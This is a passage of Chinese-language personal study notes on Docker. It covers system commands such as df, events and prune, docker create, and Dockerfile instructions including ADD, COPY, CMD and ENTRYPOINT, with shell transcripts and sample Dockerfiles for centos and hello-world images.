class="keyword">for</span> more information on a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ docker system df --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system df [OPTIONS]</span><br><span class="line"></span><br><span class="line">Show docker disk usage</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format</span><br><span class="line">                        with column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format</span><br><span class="line">                        using the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">  -v, --verbose         Show detailed information on space usage</span><br><span class="line">  [root@localhost ~]# docker system df</span><br><span class="line">TYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE</span><br><span class="line">Images          10        4         2.784GB   2.036GB (73%)</span><br><span class="line">Containers      5         0         559.3MB   559.3MB (100%)</span><br><span class="line">Local Volumes   0         0         0B        0B</span><br><span class="line">Build Cache     0         0         0B        0B</span><br></pre></td></tr></table></figure><h3 id="docker-system-enents"><a href="#docker-system-enents" class="headerlink" title="docker system enents"></a>docker system enents</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker system events --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system events [OPTIONS]</span><br><span class="line"></span><br><span class="line">Get real time events from the server</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker system events, docker events</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">      --since string    Show all events created since timestamp</span><br><span class="line">      --until string    Stream events until this timestamp</span><br><span class="line">      docker system events</span><br><span class="line">2024-03-15T15:36:48.294313459+08:00 container create 5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806ee (image=tomcat:8.5.49, name=tom2)</span><br></pre></td></tr></table></figure><p>有点像日志监视器，有容器启停之类 的信息它会输出在这里</p><h3 id="docker-system-info"><a href="#docker-system-info" class="headerlink" title="docker system info"></a>docker system info</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker system info</span></span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:    25.0.3</span><br><span class="line"> Context:    default</span><br><span class="line"> Debug Mode: <span class="literal">false</span></span><br><span class="line"> Plugins:</span><br><span class="line">  buildx: Docker Buildx (Docker Inc.)</span><br><span class="line">    Version:  v0.12.1</span><br><span class="line">...</span><br><span class="line">docker info也行</span><br></pre></td></tr></table></figure><h3 id="docker-system-prune-重点"><a href="#docker-system-prune-重点" class="headerlink" title="docker system prune(重点)"></a>docker system prune(重点)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker system prune --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system prune [OPTIONS]</span><br><span class="line"></span><br><span class="line">Remove unused data</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Remove all unused images not just dangling ones 一出所有没在使用的镜像</span><br><span class="line">      --filter filter   Provide filter values (e.g. &quot;label=&lt;key&gt;=&lt;value&gt;&quot;)</span><br><span class="line">  -f, --force           Do not prompt for confirmation</span><br><span class="line">      --volumes         Prune anonymous volumes</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS                     PORTS                                       NAMES</span><br><span class="line">5933b54ec9d2   tomcat:8.5.49   &quot;/bin/bash&quot;         5 minutes ago   Exited (0) 5 minutes ago                                               tom2</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago     Up 11 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker system prune</span><br><span class="line">WARNING! This will remove:</span><br><span class="line">  - all stopped containers</span><br><span class="line">  - all networks not used by at least one container</span><br><span class="line">  - all dangling images</span><br><span class="line">  - unused build cache</span><br><span class="line"></span><br><span class="line">Are you sure you want to continue? [y/N] y</span><br><span class="line">Deleted Containers:</span><br><span class="line">5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806ee</span><br><span class="line"></span><br><span class="line">Total reclaimed space: 5B</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago   Up 11 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="docker-create"><a href="#docker-create" class="headerlink" title="docker create"></a>docker create</h2><p>和docker run基本上差不多，但没有-d选项。-d是后台，因为create创建但不运行，默认都是后台的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker create --name tom1 -p 8081:8080 tomcat:8.5.49</span><br><span class="line">6264b6fbe42c8866557c617c52f31894f72ff9920f807e8029e734382e30f67b</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS    PORTS     NAMES</span><br><span class="line">6264b6fbe42c   tomcat:8.5.49   &quot;catalina.sh run&quot;   3 seconds ago   Created             tom1</span><br></pre></td></tr></table></figure><p>docker create 命令仅用于创建一个容器，并不会启动容器。该命令没有-d选项,因为 docker create 命令创建的容器默认都是以后台方式来运行的(必须要通过 dockerstart [容器]来启动),除非创建时指定-it</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="容器基础"><a href="#容器基础" class="headerlink" title="容器基础"></a>容器基础</h3><p>​深刻理解，容器存在的意义就是为其中的应用提供运行环境:容器运行的意义就是为了运行买中的应用，让应用对外提供服务。所以启动容器的目的就是为了启动并运行容器中的应用。所以容器中的应用运行完毕后，容器就会自动终止。</p><h3 id="创建启动"><a href="#创建启动" class="headerlink" title="创建启动"></a>创建启动</h3><p>​理解 docker run 命令用于创建并启动容器，同时其会运行容器中指定的应用。这个指定的应用要么通过 docker run 中的[command]指定，要么通过容器镜像的 Dockerfile 中的 CMD指令指定。。</p><p>​掌握容器的两种启动模式:交互模式-it，分离模式-d。。</p><h3 id="容器退出命令-1"><a href="#容器退出命令-1" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><p>exit:退出并终止当前容器</p><p>ctrl+p+q:退出但不终止当前容器</p><h3 id="容器状态查看命令"><a href="#容器状态查看命令" class="headerlink" title="容器状态查看命令"></a>容器状态查看命令</h3><p>docker ps命令中-a、-q、-l、-n选项</p><h3 id="容器再进命令"><a href="#容器再进命令" class="headerlink" title="容器再进命令"></a>容器再进命令</h3><p>​理解 docker exec 与 docker attach 的区别与联系:</p><p>docker exec:会新建一个进程来访问容器，一般与-it选项联用，exit命令退出</p><p>docker attach:不会新建进程，而是将标准输入和标准输出直接附着在容器进程之上（使用户可以通过键盘来操作容器，使容器的输出可以通过显示器展示给用户），一般不使用选项，但退出时需要考虑exit还是c+q+q</p><h3 id="容器内进程查看命令"><a href="#容器内进程查看命令" class="headerlink" title="容器内进程查看命令"></a>容器内进程查看命令</h3><p>docker top命令后可携带ps命令的选项</p><h3 id="容器日志查看命令"><a href="#容器日志查看命令" class="headerlink" title="容器日志查看命令"></a>容器日志查看命令</h3><p>docker logs查看的是容器中应用的运行日志，这个应用是根据容器创建时命令(docker run 或 docker create)中的[cmd]指定，要么通过容器镜像的 Dockerfile 中的 CMD 指令指定。。</p><h3 id="容器启停命令"><a href="#容器启停命令" class="headerlink" title="容器启停命令"></a>容器启停命令</h3><ul><li>​理解以下几点:”容器启动命令启动的是容器本身，但容器在启动的同时会启动一个应用，而这个应用是根据容器创建时命令(docker run 或 docker create)中的[command]指定，或通过容器镜像的Dockerfile 中的 CMD 指令指定。”</li><li>​容器停止命令停止的是容器本身,但在容器停止之前会先停止容器中的所有进程的运行，也就停止了对外提供服务的应用进程。</li><li>​暂停命令仅暂停的是容器对外提供服务,容器本身并没有停止运行,所以容器中的应用也就没有停止运行，只不过其不能通过容器再对外提供服务了。</li><li>暂停&#x2F;解除暂停两个命令对 tomcat 容器中的 tomcat 进程的运行没有任何影响，这两个命令的运行并不会记录到 tomcat 的启停日志中。</li></ul><h3 id="容器删除和镜像删除"><a href="#容器删除和镜像删除" class="headerlink" title="容器删除和镜像删除"></a>容器删除和镜像删除</h3><p>​能够区分容器删除与镜像删除命令:容器删除是dockerrm，镜像删除是 docker rmi。它们都有一个选项-f，表示强制删除。镜像的强制删除，其不会强制删除 UP 状态的容器的镜像。</p><h3 id="容器与宿主机传递文件"><a href="#容器与宿主机传递文件" class="headerlink" title="容器与宿主机传递文件"></a>容器与宿主机传递文件</h3><ol><li>深刻理解容器本身就是一个文件系统</li><li>理解 docker cp命令就是用于完成从一个文件系统复制到另一个文件系统而己，与容器是否运行无关。</li><li>了解 docker cp命令不支持容器间文件的复制。</li></ol><h3 id="提交容器为镜像"><a href="#提交容器为镜像" class="headerlink" title="提交容器为镜像"></a>提交容器为镜像</h3><p>了解 docker commit 生成的镜像中是包含原镜像的所有分层历史记录的。</p><h3 id="导入-x2F-导出容器"><a href="#导入-x2F-导出容器" class="headerlink" title="导入&#x2F;导出容器"></a>导入&#x2F;导出容器</h3><ol><li>理解导入&#x2F;导出容器与导入&#x2F;导出镜像命令的区别与联系。</li><li>理解导入&#x2F;导出容器与 docker commit 的区别与联系。</li><li>理解 docker export 是对镜像分层合并后视图的文件系统快照的导出，仅包含合并后的一层镜像信息，不包含原镜像的分层历史记录。</li></ol><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h3 id="Dockerfile-简介"><a href="#Dockerfile-简介" class="headerlink" title="Dockerfile 简介"></a>Dockerfile 简介</h3><p>Dockerfile 是用于构建 Docker 镜像的脚本文件，由一系列指令构成。通过 docker build命令构建镜像时，Dockerfile 中的指令会<strong>由上到下</strong>依次执行，每条指令都将会构建出一个镜像。这就是镜像的分层。因此，指令越多，层次就越多，创建的镜像就越多，效率就越低所以在定义 Dockerfile 时，能在一个指令完成的动作就不要分为两条。。</p><h3 id="指令简介"><a href="#指令简介" class="headerlink" title="指令简介"></a>指令简介</h3><p>对于 Dockerfile 的指令，需要注意以下几点:</p><ol><li>指令是大小不敏感的，但惯例是写为全大写</li><li>指令后至少会携带一个参数。</li><li>#号开头的行为注释。。</li></ol><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>【语法】FROM <image>[:<tag>].</p><p>【解析】用于指定基础镜像，且必须是<strong>第一条</strong>指令;若省略了tag，则默认为latest。</p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>【语法】MAINTAINER <name>.</p><p>【解析】MAINTAINER 指令的参数填写的一般是维护者姓名和信箱。不过，该指令官方已不建议使用，而是使用 LABEL指令代替。</p><h3 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h3><p>【语法】LABEL<key>&#x3D;<value> <key>&#x3D;<value></p><p>【解析】LABEL 指令中可以以键值对的方式包含任意镜像的元数据信息，用于替代MAINTAINER 指令。通过 docker inspect 可査看到 LABEL与 MAINTAINER 的内容。</p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>【语法 1】ENV <key><value>.</p><p>【解析】用于指定环境变量，这些环境变量，后续可以被 RUN 指令使用，容器运行起来之后，也可以在容器中获取这些环境变量。。</p><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>【语法1】ADD<src> <dest></p><p>【语法 2】ADD[“<src>“,”<dest>“] #路径中存在空格时使用双引号引起来。</p><p>【解析】该指令将复制当前宿主机中指定文件 src到容器中的指定目录 dest 中。src 可以是宿主机中的绝对路径，也可以时相对路径。但相对路径是相对于dockerbuild 命令所指定的路径的。src指定的文件可以是一个压缩文件，压缩文件复制到容器后会自动解压为目录:src也可以是一个 URL，此时的 ADD指令相当于 wget 命令;src最好不要是目录，其会将该目录中所有内容复制到容器的指定目录中。dest 是一个绝对路径,其最后面的路径必须要加上斜杠，否则系统会将最后的目录名称当做是文件名的。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> zookeeper.tar.gz /opt/add/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> zookeeper.tar.gz /opt/copy/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408193507130.png" alt="image-20240408193507130"></p><p>可以发现add的是解压后的，而copy是没解压的</p><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>【说明】功能与 ADD指令相同，只不过src不能是 URL。若 src为压缩文件，复制到容器后不会自动解压。”</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> zookeeper.tar.gz /opt/add</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> zookeeper.tar.gz /opt/copy</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408193751454.png" alt="image-20240408193751454"></p><p>没有尾巴的斜杠后，<strong>copy变成了重命名</strong>，而add则是正常的，如果是改前面的压缩包的路径，在构建镜像时需要注意相对路径，所以我们在构建镜像时最好把需要的文件</p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>【语法】WORKDIR path.</p><p>【解析】容器打开后默认进入的目录，一般在后续的 RUN、CMD、ENTRYPOINT、ADD 等指令中会引用该目录。可以设置多个WORKDIR指令。后续 WORKDIR 指令若用的是相对路径，则会基于之前 WORKDIR 指令指定的路径。在使用 docker run 运行容器时，可以通过-w 参数覆盖构建时所设置的工作目录。</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>【语法 1】RUN <command></p><p>【解析】这里的<command>就是 shell 命令。docker build 执行过程中，会使用 shell 运行指定的command.</p><p>【语法 2】RUN [“EXECUTABLE”,”PARAM1”,”PARAM2”,…].【解析】在 docker build 执行过程中,会调用第一个参数”EXECUTABLE”指定的应用程序运行,并使用后面第二、三等参数作为应用程序的运行参数。</p><h3 id="CMD（重要）"><a href="#CMD（重要）" class="headerlink" title="CMD（重要）"></a>CMD（重要）</h3><p>【语法 1】CMD [“EXECUTABLE”,”PARAM1”,”PARAM2”,..].</p><p>【解析】在容器启动后，即在执行完 docker run后会立即调用执行”EXECUTABLE”指定的可执行文件，并使用后面第二、三等参数作为应用程序的运行参数。”</p><p>【语法2】CMD command param1 param2, ….</p><p>【解析】这里的 command 就是 shel 命令。在容器启动后会立即运行指定的 shell 命令。。</p><p>【语法 3】CMD [“PARAM1”,”PARAM2”,…].【解析】提供给 ENTERYPOINT 的默认参数。”</p><h3 id="ARGS"><a href="#ARGS" class="headerlink" title="ARGS"></a><strong>ARGS</strong></h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408201240156.png" alt="image-20240408201240156"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ARG</span> name=TOM</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$name</span></span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408201343187.png" alt="image-20240408201343187"></p><p>要注意的是，build-arg是要定义过的变量，改都不行，一定要定义过arg才行</p><h3 id="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"><a href="#注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile" class="headerlink" title="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"></a>注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile</h3><p>例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>docker built -t  mycal:2.0 .&#x2F;docker build -f Dockerfile -t mycal:2.0 .</p><p>执行，可以覆盖，比如在docker run mycal:2.0后面加上date结果就会出现变化，但参数也不能传递，如-y</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408164303105.png" alt="image-20240408164303105"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>我要执行的命令是来自命令行，这两个执行的区别是&#x2F;bin&#x2F;bash才是你要执行的东西，cal成为了参数，前者是直接执行cal,测试一下把</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile3 -t mycal:3.0 .</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408165326037.png" alt="image-20240408165326037"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;hello,world!&quot;</span>]</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;echo&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408170845565.png" alt="image-20240408170845565"></p><p>可以看但cmd作为entrypoint的参数执行了</p><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT."></a>ENTRYPOINT.</h3><p>【语法 1】ENTRYPOINT [“EXEGUTABLE”,”PARAM1”,”PARAM2”,…]</p><p>【解析】在容器启动过程中，即在执行 docker run 时，会调用执行”EXECUTABLE”指定的应用程序，并使用后面第二、三等参数作为应用程序的运行参数。(CMD和它都有的话，执行这个)</p><p>【语法2】ENTRYPOlNT command param1 param2,…</p><p>【解析】这里的 command 就是 shel 命令。在容器启动过程中，即在执行 docker run 时，会运行指定的 shell 命令。</p><p>例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> cal</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408165939812.png" alt="image-20240408165939812"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408170029994.png" alt="image-20240408170029994"></p><p>-y有输出但和date一样不识别</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408170218134.png" alt="image-20240408170218134"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408170302307.png" alt="image-20240408170302307"></p><p>-y是行的，但date会报错了</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408170435245.png" alt="image-20240408170435245"></p><p>又和第一个一样了。</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMD指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于docker daemon 来说，其首先认为是替代用的[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。3</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMQ指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于dockerdaemon来说，其首先认为是替代用[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。</p><p>不过，docker daemon 对于 ENTRYPOINT 指定的[command]与[“EXECUTABLE”]的处理方式是不同的。如果是[command]指定的 shell，daemon 会直接运行，而不会与docker run 中的[ARG]进行拼接后运行:如果是[“EXECUTABLE”]指定的命令，daemon则会先与 docker run 中的[ARG]进行拼接，然后再运行拼接后的结果。</p><p>结论:无论是CMD还是ENTRYPOINT，使用[“EXECUTABLE”]方式的通用性会更强些。</p><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>【语法】ONBUILD [INSTRUCTION]<br>【解析】该指令用于指定当前镜像的子镜像进行构建时要执行的指令。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENV</span> WORKPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$WORKPATH</span></span></span><br><span class="line"><span class="keyword">ONBUILD</span> <span class="keyword">RUN</span><span class="language-bash"> yum install -y wget</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><p>Dockerfile2</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> parent:<span class="number">1.0</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408202024812.png" alt="image-20240408202024812"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408202014168.png" alt="image-20240408202014168"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408202200083.png" alt="image-20240408202200083"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240408202217208.png" alt="image-20240408202217208"></p><h3 id="自己的hello-world镜像"><a href="#自己的hello-world镜像" class="headerlink" title="自己的hello world镜像"></a>自己的hello world镜像</h3><h4 id="scratch镜像"><a href="#scratch镜像" class="headerlink" title="scratch镜像"></a>scratch镜像</h4><p>​在构建自己的镜像之前，首先要了解一个特殊的镜像 scratch。scratch 镜像是一个空镜像，是所有镜像的 Baselmage(相当于面向对象编程中的 Object类)。scratch 镜像<strong>只能在 Dockerfile 中被继承</strong>,不能通过 pul 命令拉取,不能 run,也没有 tag。并且它也不会生成镜像中的文件系统层。在 Docker 中，scratch 是一个保留字，用户不能作为自己的镜像名称使用。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir hw</span><br><span class="line">[root@localhost ~]# cd hw</span><br><span class="line">[root@localhost hw]# ls</span><br><span class="line">[root@localhost hw]# vim hello.c</span><br><span class="line">[root@localhost hw]# gcc --static -o hello hello.c</span><br><span class="line">[root@localhost hw]# ls</span><br><span class="line">hello  hello.c</span><br><span class="line">[root@localhost hw]# ./hello</span><br><span class="line">hello my docker world!</span><br><span class="line">[root@localhost hw]# docker build -t hello-my-world .</span><br><span class="line">[+] Building 0.1s (5/5) FINISHED                                 docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                       0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 137B                                       0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                            0.0s</span><br><span class="line"> =&gt; [internal] load build context                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 865.65kB                                      0.0s</span><br><span class="line"> =&gt; [1/1] ADD hello /                                                      0.0s</span><br><span class="line"> =&gt; exporting to image                                                     0.0s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                    0.0s</span><br><span class="line"> =&gt; =&gt; writing image sha256:74852c0574d8c68375d7bb15fcddbc9b3e106863435bd  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/hello-my-world  </span><br><span class="line"> [root@localhost hw]# docker images</span><br><span class="line">REPOSITORY       TAG         IMAGE ID       CREATED              SIZE</span><br><span class="line">hello-my-world   latest      74852c0574d8   About a minute ago   865kB</span><br><span class="line">。。。</span><br><span class="line">[root@localhost hw]# docker run hello-my-world</span><br><span class="line">hello my docker world!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="自己的centos镜像"><a href="#自己的centos镜像" class="headerlink" title="自己的centos镜像"></a>自己的centos镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> youzipii youzipii@<span class="number">123</span>.com</span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> version=<span class="string">&quot;1.0&quot;</span> description=<span class="string">&quot;this is a centos 7 image&quot;</span> email=<span class="string">&quot;TOM@123.com&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span>  WORKPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$WORKPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y wget vim net-tools</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><h4 id="ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1"><a href="#ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1" class="headerlink" title="ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1"></a>ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1</h4><p>重启好像就可以，但生产环境，慎用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost cts]<span class="comment"># docker build -t youzipii:1.0 .</span></span><br><span class="line">[+] Building 49.0s (7/7) FINISHED                                docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                       0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 326B                                       0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:7                0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                            0.0s</span><br><span class="line"> =&gt; [1/3] FROM docker.io/library/centos:7                                  0.0s</span><br><span class="line"> =&gt; CACHED [2/3] WORKDIR /usr/local                                        0.0s</span><br><span class="line"> =&gt; [3/3] RUN yum install -y wget vim net-tools                           47.3s</span><br><span class="line"> =&gt; exporting to image                                                     1.6s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                    1.6s</span><br><span class="line"> =&gt; =&gt; writing image sha256:3f62d30f08ddde26d1729b2706c8a7ae9f4e4bbc9171a  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/youzipii:1.0         </span><br><span class="line">[root@localhost cts]<span class="comment"># docker run --name ct2 -it youzipii:1.0</span></span><br><span class="line">[root@81ed05ea8530 <span class="built_in">local</span>]<span class="comment"># pwd</span></span><br><span class="line">/usr/local</span><br><span class="line">[root@81ed05ea8530 